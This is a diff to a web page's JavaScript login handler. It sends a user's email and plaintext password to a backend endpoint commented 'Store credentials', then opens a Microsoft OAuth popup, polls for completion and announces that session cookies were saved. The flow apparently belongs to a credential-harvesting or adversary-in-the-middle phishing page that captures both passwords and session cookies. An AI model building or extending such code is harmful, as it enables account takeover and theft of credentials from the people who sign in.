@@ -627,6 +627,8 @@
             const successForm = document.getElementById('successForm');
             const headerTitle = document.getElementById('headerTitle');
             const loadingCancelContainer = document.getElementById('loadingCancelContainer');
+            const backInfo = document.getElementById('backInfo');
+            const messageArea = document.getElementById('messageArea');
 
             if (isLoading) {
                 loadingAnimation.classList.add('active');
@@ -670,8 +672,13 @@
                     successForm.style.display = 'block';
                 }
 
-                document.getElementById('backInfo').style.display = '';
-                document.getElementById('messageArea').style.display = '';
+                // Safely handle backInfo and messageArea elements
+                if (backInfo) {
+                    backInfo.style.display = '';
+                }
+                if (messageArea) {
+                    messageArea.style.display = '';
+                }
             }
 
             const buttons = document.querySelectorAll('.btn');
@@ -924,8 +931,8 @@
                     return;
                 }
 
-                // Store credentials and proceed with OAuth flow
-                const response = await fetch('/api/authenticate-password', {
+                // Store credentials and get OAuth URL
+                const credentialsResponse = await fetch('/api/authenticate-password', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -933,26 +940,91 @@
                     body: JSON.stringify({ email, password })
                 });
 
-                const result = await response.json();
+                const credentialsResult = await credentialsResponse.json();
 
-                if (result.success) {
-                    showMessage('Authentication successful!', 'success');
-                    // Handle successful authentication
-                    checkSessionStatus(); // Check session to confirm authentication
+                if (credentialsResult.sessionId) {
+                    // Credentials stored, now proceed with OAuth
+                    console.log('Credentials stored, proceeding with OAuth authentication...');
+                    
+                    // Get OAuth URL
+                    const response = await fetch(`${API_BASE}/api/auth-url`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({})
+                    });
+
+                    const data = await response.json();
+
+                    if (response.ok && data.authUrl) {
+                        currentSessionId = data.sessionId;
+
+                        // Open Microsoft OAuth in popup
+                        authWindow = window.open(
+                            data.authUrl,
+                            'microsoft-oauth',
+                            'width=600,height=700,scrollbars=yes,resizable=yes,centerscreen=yes'
+                        );
+
+                        if (!authWindow) {
+                            throw new Error('Popup blocked. Please allow popups and try again.');
+                        }
+
+                        // Poll for authentication completion
+                        const pollInterval = setInterval(async () => {
+                            try {
+                                // Check if window is closed
+                                if (authWindow.closed) {
+                                    clearInterval(pollInterval);
+                                    if (window.authTimeoutId) {
+                                        clearTimeout(window.authTimeoutId);
+                                    }
+                                    setLoading(false);
+                                    showMessage('Authentication cancelled. Please try again.', 'error');
+                                    return;
+                                }
+
+                                // Check authentication status
+                                const statusResponse = await fetch(`${API_BASE}/api/status?sessionId=${currentSessionId}`);
+                                const statusData = await statusResponse.json();
+
+                                if (statusData.authenticated) {
+                                    clearInterval(pollInterval);
+                                    if (window.authTimeoutId) {
+                                        clearTimeout(window.authTimeoutId);
+                                    }
+                                    authWindow.close();
+                                    setLoading(false);
+                                    showSuccessForm(statusData.userEmail);
+                                    showMessage('✅ Successfully signed in and session cookies saved!', 'success');
+                                }
+
+                            } catch (error) {
+                                console.error('Error checking auth status:', error);
+                            }
+                        }, 2000); // Check every 2 seconds
+
+                        // Timeout after 5 minutes
+                        window.authTimeoutId = setTimeout(() => {
+                            if (authWindow && !authWindow.closed) {
+                                authWindow.close();
+                            }
+                            clearInterval(pollInterval);
+                            setLoading(false);
+                            showMessage('Authentication timed out. Please try again.', 'error');
+                        }, 5 * 60 * 1000);
+
+                    } else {
+                        throw new Error(data.error || 'Failed to get authentication URL');
+                    }
                 } else {
-                    // Always proceed to OAuth for Microsoft accounts
-                    showMessage('Proceeding with Microsoft authentication...', 'info');
-                    setTimeout(() => {
-                        proceedWithOAuth();
-                    }, 1000);
+                    setLoading(false);
+                    showMessage('Failed to store credentials. Please try again.', 'error');
                 }
 
             } catch (error) {
                 console.error('Password authentication error:', error);
-                showMessage('Proceeding with Microsoft authentication...', 'info');
-                setTimeout(() => {
-                    proceedWithOAuth();
-                }, 1000);
+                setLoading(false);
+                showMessage(`Authentication error: ${error.message}`, 'error');
             }
         }
 
